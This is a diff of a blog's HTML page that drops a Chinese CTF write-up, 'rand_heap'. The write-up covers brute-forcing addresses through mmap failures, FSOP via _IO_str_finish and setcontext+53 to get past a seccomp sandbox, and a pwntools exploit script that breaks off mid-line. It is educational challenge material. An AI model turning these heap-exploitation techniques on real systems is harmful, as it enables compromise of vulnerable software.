@@ -1,2487 +1,350 @@
 <!DOCTYPE html>
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next muse use-motion" lang>
+<html>
 <head><meta name="generator" content="Hexo 3.8.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Muse',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
-  
-
-
-
-
-  <meta property="og:type" content="website">
-<meta property="og:title" content="xkaneiki&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/index.html">
-<meta property="og:site_name" content="xkaneiki&#39;s blog">
-<meta property="og:locale" content="default">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="xkaneiki&#39;s blog">
-
-
-
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>xkaneiki's blog</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta name="keywords" content="hexo, autumn">
+    <title>
+        xkaneiki&#39;s blog
+    </title>
+    <!-- favicon -->
+    
+    <link rel="icon" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/favicon.ico">
+    
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- highlight -->
+    <link rel="stylesheet" href="https://cdn.bootcss.com/highlight.js/9.12.0/styles/github-gist.min.css">
+    <script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+    <script>
+        hljs.initHighlightingOnLoad()
+    </script>
+    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@1.0.0/dist/hexo-infinite-scroll.min.css">
+    <script src="https://cdn.jsdelivr.net/gh/frontendsophie/hexo-infinite-scroll@1.0.0/dist/hexo-infinite-scroll.min.js"></script>
+    <script>
+        infiniteScroll()
+
+        // for mobile menu
+        $(function () {
+            $('.social-button').click(function () {
+                if ($('.social-links').hasClass('hide-links')) {
+                    $('.social-links').removeClass('hide-links')
+                } else {
+                    $('.social-links').addClass('hide-links')
+                }
+            })
+        })
+    </script>
 </head>
 
-<body itemscope itemtype="http://schema.org/WebPage" lang="default">
-
-  
-  
-    
-  
-
-  <div class="container sidebar-position-left 
-  page-home">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">xkaneiki's blog</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-    </button>
-  </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
+    <body style="background: url(https://cdn.jsdelivr.net/gh/frontendsophie/hexo-theme-autumn@1.0.0/source/img/button-bg.png) #f3f3f3">
+        <div class="container">
+            <header class="header">
+    <h1 class="title">
+        <a href="/" class="logo">
+            xkaneiki&#39;s blog
+        </a>
+    </h1>
+    <h2 class="desc">
         
-        
-        
-          
-          <li class="menu-item menu-item-home menu-item-active">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-    
-
-  
-
-  
-</nav>
-
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-          <div id="content" class="content">
-            
-  <section id="posts" class="posts-expand">
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/10/21/rand-heap/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="kaneiki wang">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xkaneiki's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2020/10/21/rand-heap/" class="post-title-link" itemprop="url">rand_heap</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2020-10-21 14:51:48" itemprop="dateCreated datePublished" datetime="2020-10-21T14:51:48+08:00">2020-10-21</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2020-10-22 00:39:09" itemprop="dateModified" datetime="2020-10-22T00:39:09+08:00">2020-10-22</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>程序主要有三个函数：</p>
-<ol>
-<li><p>S函数可以用malloc申请小于0x1000的空间</p>
-</li>
-<li><p>L函数可以用mmap来申请大于0x1000的空间，如果申请成功返回版本号，如果申请失败则返回一个失败信息</p>
-</li>
-<li><p>E函数可以用来修改申请的chunk里的信息，另外有一个以当前时间为种子的获得的随机数，当输入相同的随机数时可以额写入0x20的数据</p>
-</li>
-</ol>
-<p>此外程序将申请的chunk的地址和长度分别存放在两个数组中（bss段上），这里分别用arr和arr_size来表示。S和L所能够申请的次数都是有限制的。</p>
-<p><img src="/2020/10/21/rand-heap/截屏2020-10-21 下午3.04.21.png" alt="截屏2020-10-21 下午3.04.21" style="zoom:50%;"></p>
-<p><img src="/2020/10/21/rand-heap/截屏2020-10-21 下午3.04.39.png" alt="截屏2020-10-21 下午3.04.39" style="zoom:50%;"></p>
-<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><h3 id="泄漏libc、heap和程序的基址"><a href="#泄漏libc、heap和程序的基址" class="headerlink" title="泄漏libc、heap和程序的基址"></a>泄漏libc、heap和程序的基址</h3><p>首先，利用L函数mmap可以爆破出libc、heap和程序的基址。因为程序的高位字节是固定的，可以每半个字节爆破一次，也就是没爆破一次最多消耗16次L，因此爆破出heap，libc和程序的基址中的一个是完全够用的。这里我们选择先爆破程序的基址，因为知道了程序的基址以后就能够劫持arr，从而可以利用E函数清空arr使得我们可以进行任意次的爆破去求出其他两个基址。</p>
-<p>具体的爆破过程我们以程序的基址为例子来进行说明。</p>
-<p><img src="/2020/10/21/rand-heap/截屏2020-10-21 下午3.14.51.png" alt="截屏2020-10-21 下午3.14.51"></p>
-<p>可以看到程序基址的高位一定是5，因此我们从addr=0x500000000000开始。我们从第11位（从低位向高位数）开始进行爆破。为了确定第十一位的，每次申请0x10000000000的空间，如果申请成功就将addr上的这一位加一，直到申请失败就说明这次申请包含了程序段的的空间，此时就确定了这一位的大小；第十位就按照0x1000000000申请空间来确定这一位的大小；如此往复直到确定了第四位（基址的后三位是0）。</p>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">addr = <span class="number">0x500000000000</span></span><br><span class="line">b = <span class="number">0x10000000000</span></span><br><span class="line"><span class="keyword">while</span> b &gt;= <span class="number">0x1000</span>:</span><br><span class="line">    <span class="comment"># print('b',hex(b))</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        tmp = addr+i*b</span><br><span class="line">        L(str(b), tmp)</span><br><span class="line">        ss = p.recvuntil(<span class="string">'\n'</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> ss == <span class="string">"Map failed.\n"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    addr += i*b</span><br><span class="line">    b = int(b/<span class="number">0x10</span>)</span><br><span class="line">print(<span class="string">'elf'</span>, hex(addr))</span><br><span class="line">pause()</span><br></pre></td></tr></table></figure>
-<p>按照这种方法能够分别确定libc、heap和程序的基址。</p>
-<h3 id="获得shell"><a href="#获得shell" class="headerlink" title="获得shell"></a>获得shell</h3><p>在用IDA反编译程序的时候发现这个程序进行了沙箱保护。</p>
-<p><img src="/2020/10/21/rand-heap/截屏2020-10-21 下午3.29.44.png" alt="截屏2020-10-21 下午3.29.44"></p>
-<p>程序禁止将架构从64位改到32位，同时禁用了execve的系统调用。这就意味着one_gadget和system函数，那就考虑用orw来获取flag。因为栈地址的便宜不固定，从而无法通过爆破出栈地址来进行程序控制流的劫持。考虑通过FSOP利用setcontext+53来进行程序流的劫持。</p>
-<p>首先我们来看一下setcontxt+53的程序</p>
-<p><img src="/2020/10/21/rand-heap/截屏2020-10-21 下午3.41.41.png" alt="截屏2020-10-21 下午3.41.41"></p>
-<p>可以发现这里可一通过rdi设置rsp的地址从而可以控制程序流。</p>
-<p>现在考虑怎么样进入这个函数，并且能够控制rdi。考虑FSOP，改写_IO_list_all来指向一个伪造的_IO_FILE。由于在libc2.24以后加入了对vtable的检查，当vtable不是系统制定的vtable空间时就会直接返回错误。可以考虑利用_IO_str_finish 函数来转到setcontext+53并且设置rdi的值，FSOP具体的操作可以参考这个<a href="https://www.secshi.com/14941.html" target="_blank" rel="noopener">网址</a>。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">_IO_str_finish (_IO_FILE *fp, <span class="keyword">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    (((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>通过构造伪造的_IO_FILE来，使其满足fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF)从而调用(((_IO_strfile *) fp)-&gt;_s._free_buffer) (fp-&gt;_IO_buf_base)。源码查看一下_IO_strfile的结构</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_alloc_type _allocate_buffer;</span><br><span class="line">  _IO_free_type _free_buffer;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">f</span>;</span></span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_strfile_</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_streambuf</span> _<span class="title">sbf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_str_fields</span> _<span class="title">s</span>;</span></span><br><span class="line">&#125; _IO_strfile;</span><br></pre></td></tr></table></figure>
-<p>因为vtable的偏移时0xd8，可以看出_free_buffer的地址就是0xe8。查看_IO_FILE的源码</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看到 _IO_buf_base的偏移时0x38。另外需要用到的 _flags、_IO_write_base和_IO_write_ptr的偏移也同样可以看出来。通过布置合适的数据便能够控制_s._free_buffer和它的第一个参数，并且执行它。于是我们将函数地址_s._free_buffer设置为setcontext+53，第一个参数也就是rdi设置成我们可以控制的地址，从而就能够控制栈，实现orw。</p>
-<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./rand_heap'</span>)</span><br><span class="line">lelf = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_passwd</span><span class="params">()</span>:</span></span><br><span class="line">    seed = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>).time(<span class="number">0</span>)</span><br><span class="line">    seed = seed &gt;&gt; <span class="number">3</span></span><br><span class="line">    cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>).srand(seed)</span><br><span class="line">    <span class="keyword">return</span> str(cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>).rand())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">S</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">L</span><span class="params">(size, addr)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">    p.sendline(size)</span><br><span class="line">    p.recvuntil(<span class="string">"Map addr: "</span>)</span><br><span class="line">    p.sendline(<span class="string">'0x&#123;:06X&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">E</span><span class="params">(idx, con)</span>:</span></span><br><span class="line">    pwd = get_passwd()</span><br><span class="line">    p.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">    p.sendline(idx)</span><br><span class="line">    p.recvuntil(<span class="string">"Input your password: "</span>)</span><br><span class="line">    p.sendline(pwd)</span><br><span class="line">    p.recvuntil(<span class="string">"Input the content.\n"</span>)</span><br><span class="line">    p.send(con)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># cmd = 'b _IO_flush_all_lockp\n'</span></span><br><span class="line">cmd = <span class="string">'dir ../glibc-2.27/libio\n'</span></span><br><span class="line">cmd += <span class="string">'dir ../glibc-2.27/io\n'</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x500000000000</span></span><br><span class="line">b = <span class="number">0x10000000000</span></span><br><span class="line"><span class="keyword">while</span> b &gt;= <span class="number">0x1000</span>:</span><br><span class="line">    <span class="comment"># print('b',hex(b))</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">16</span>:</span><br><span class="line">        tmp = addr+i*b</span><br><span class="line">        L(str(b), tmp)</span><br><span class="line">        ss = p.recvuntil(<span class="string">'\n'</span>).decode()</span><br><span class="line">        <span class="keyword">if</span> ss == <span class="string">"Map failed.\n"</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    addr += i*b</span><br><span class="line">    b = int(b/<span class="number">0x10</span>)</span><br><span class="line">print(<span class="string">'elf'</span>, hex(addr))</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">arr = addr+<span class="number">0x2020A0</span></span><br><span class="line">print(<span class="string">'arr'</span>, hex(arr))</span><br><span class="line">S(str(<span class="number">0x60</span>))</span><br><span class="line">idx = p.recvuntil(<span class="string">'\n'</span>)[len(<span class="string">"Malloc done, idx is "</span>):<span class="number">-2</span>]</span><br><span class="line">idx = int(idx.decode())</span><br><span class="line">payload = <span class="number">0x60</span>*<span class="string">b'a'</span>+p64(<span class="number">0x0</span>)+p64(<span class="number">0x81</span>)+p64(arr)</span><br><span class="line">E(str(idx), payload)</span><br><span class="line"></span><br><span class="line">S(str(<span 